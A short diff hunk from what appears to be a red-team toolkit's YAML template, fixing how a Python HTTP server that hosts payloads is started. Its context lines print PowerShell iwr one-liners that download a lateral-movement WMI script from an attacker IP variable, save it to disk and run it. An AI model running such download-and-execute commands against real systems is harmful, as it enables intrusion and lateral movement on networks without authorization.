@@ -29,4 +29,4 @@ content: |
   echo 'Deliver & save to disk: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/lateral-movement-wmi.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\lateral-movement-wmi.ps1'; \
   echo 'Deliver, save to disk & execute: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/lateral-movement-wmi.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\lateral-movement-wmi.ps1; <%=$(esh variables/delivery_path_windows)%>\lateral-movement-wmi.ps1'; \
   echo '================================================================'; \
-  python -m <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
